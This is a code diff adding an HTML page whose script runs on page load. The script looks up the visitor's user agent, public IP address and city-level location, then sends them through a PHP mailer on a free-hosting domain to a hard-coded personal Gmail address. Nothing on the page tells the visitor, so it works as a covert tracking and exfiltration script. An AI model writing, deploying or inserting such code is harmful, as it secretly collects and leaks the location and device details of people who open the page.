@@ -1,0 +1,36 @@
+<html>
+	<script>
+		function emailUserInfo() {
+  // Get user agent string
+  const userAgentString = window.navigator.userAgent;
+
+  // Get public IP address and location using a free API service
+  fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+      const publicIpAddress = data.ip;
+      const ipAddressLocation = `${data.city}, ${data.region}, ${data.country_name}`;
+
+      // Prepare the URL with query parameters
+      const url = `https://nestlegh.000webhostapp.com/phpmailer.php?to=aagortey@gmail.com&subject=User%20Information&message=User%20Agent:%20${encodeURIComponent(userAgentString)}%0A%0APublic%20IP%20Address:%20${publicIpAddress}%0A%0AIP%20Address%20Location:%20${encodeURIComponent(ipAddressLocation)}`;
+
+      // Send a GET request to the PHP script URL to send the email
+      fetch(url)
+        .then(response => response.text())
+        .then(data => {
+          console.log('Email sent successfully:', data);
+        })
+        .catch(error => {
+          console.error('Error sending email:', error);
+        });
+    })
+    .catch(error => {
+      console.error('Error fetching IP address location:', error);
+    });
+}
+
+// Call the function to email the user information
+emailUserInfo();
+
+	</script>
+</html>
